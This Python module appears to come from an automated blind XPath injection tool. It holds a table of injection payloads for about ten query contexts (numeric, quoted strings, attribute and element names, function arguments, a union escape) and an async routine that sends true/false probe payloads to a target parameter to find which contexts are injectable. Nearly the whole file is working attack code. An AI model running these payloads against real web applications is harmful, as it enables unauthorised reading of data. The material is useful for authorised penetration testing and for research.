import asyncio
from collections import namedtuple
from typing import List

from xpath import E

from .requester import Requester

Injection = namedtuple('Injection', 'name example test_payloads payload_generator')


def makeformat(str):
    return lambda working, expression: str.format(working=working, expression=expression)


injectors = [
    Injection('integer',
              "/lib/book[id=?]",
              (
                  ('{working} and 1=1', True),
                  ('{working} and 1=2', False)
              ),
              makeformat("{working} and {expression}")),
    Injection('string - single quote',
              "/lib/book[name='?']",
              (
                  ("{working}' and '1'='1", True),
                  ("{working}' and '1'='2", False),
              ),
              makeformat("{working}' and {expression} and '1'='1")),
    Injection('string - double quote',
              '/lib/book[name="?"]',
              (
                  ('{working}" and "1"="1', True),
                  ('{working}" and "1"="2', False),
              ),
              makeformat('{working}" and {expression} and "1"="1')),
    Injection('attribute name - prefix',
              "/lib/book[?=value]",
              (
                  ("1=1 and {working}", True),
                  ("1=2 and {working}", False)
              ),
              lambda working, expression: expression & E(working)),
    Injection('attribute name - postfix',
              "/lib/book[?=value]",
              (
                  ("{working} and not 1=2 and {working}", True),
                  ("{working} and 1=2 and {working}", False)
              ),
              lambda working, expression: working & expression & E(working)),
    Injection('element name - prefix',
              "/lib/something?/",
              (
                  (".[true()]/{working}", True),
                  (".[false()]/{working}", False)
              ),
              lambda working, expression: E('.')[expression].add_path('/' + working)),
    Injection('element name - postfix',
              "/lib/?something",
              (
                  ("{working}[true()]", True),
                  ("{working}[false()]", False)
              ),
              lambda working, expression: E(working)[expression]),
    Injection('function call - last string parameter - single quote',
              "/lib/something[function(?)]",
              (
                  ("{working}') and true() and string('1'='1", True),
                  ("{working}') and false() and string('1'='1", False),
              ),
              makeformat("{working}') and {expression} and string('1'='1")),
    Injection('function call - last string parameter - double quote',
              "/lib/something[function(?)]",
              (
                  ('{working}") and true() and string("1"="1', True),
                  ('{working}") and false() and string("1"="1', False),
              ),
              makeformat('{working}") and {expression} and string("1"="1')),
    Injection('other elements - last string parameter - double quote',
              "/lib/something[function(?) and false()] | //*[?]",
              (
                  ('{working}") and false()] | //*[true() and string("1"="1', True),
                  ('{working}") and false()] | //*[false() and string("1"="1', False),
              ),
              makeformat('{working}") and false()] | //*[{expression} and string("1"="1'))

]


async def detect_payload(requester: Requester) -> List[Injection]:
    working = requester.target_parameter_value

    returner = []

    for injector in injectors:
        result_futures = [
            requester.check(test_payload.format(working=working))
            for (test_payload, expected) in injector.test_payloads
            ]

        results = await asyncio.gather(*result_futures)

        for idx, (test_payload, expected) in enumerate(injector.test_payloads):
            if results[idx] == expected:
                continue
            break
        else:
            returner.append(injector)

    return returner
